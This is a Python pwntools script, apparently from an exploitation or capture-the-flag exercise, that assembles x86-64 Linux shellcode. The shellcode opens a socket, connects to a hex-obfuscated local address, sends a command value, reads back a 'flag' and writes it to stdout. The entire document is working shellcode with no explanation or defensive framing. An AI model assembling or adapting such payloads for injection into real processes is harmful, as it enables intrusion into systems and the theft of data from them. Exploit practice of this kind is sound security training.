from pwn import *

context.os = "linux"
context.arch = 'amd64'

def get_shellcode():
    shell_socket = '''
        xor rdi, rdi
        mov dil, 2
        xor rsi, rsi
        mov sil, 1
        xor rdx, rdx
        xor rax, rax
        mov al, 0x29
        syscall
        mov r8, rax
    '''
    shell_connect = '''
        mov rdi, r8
        xor rdx, rdx
        mov dl, 0x10

        xor rax, rax
        mov al, 0x2a
        
        xor r9, r9
        push r9
        mov rsi, 0xffffffffffffffff
        mov r9, 0xfeffff80c2ddfffd
        sub rsi, r9
        push rsi
        mov rsi, rsp
        syscall
    '''
    shell_write_CmdFlag = '''   
        xor r9, r9
        mov r9w, 0x8787
        push r9
        
        mov rdi, r8
        mov rsi, rsp
        xor rdx, rdx 
        mov dl, 0xa4
        xor rax, rax 
        mov al, 1
        syscall
    ''' 
    shell_read_Flag = '''
        xor rax, rax
        mov rdi, r8
        mov rsi, rsp
        xor rdx, rdx
        mov dx, 0x0104
        syscall
    '''
    shell_write_stdout = '''   
        xor rdi, rdi
        mov dil, 1
        mov rsi, rsp
        xor rdx, rdx 
        mov dl, 0x40
        xor rax, rax 
        mov al, 1
        syscall
    ''' 
    shellcode = shell_socket + shell_connect + shell_write_CmdFlag + shell_read_Flag + shell_write_stdout
    return shellcode

shellcode = get_shellcode()
sc_bytes = asm(shellcode)
print("sc bytes:", sc_bytes)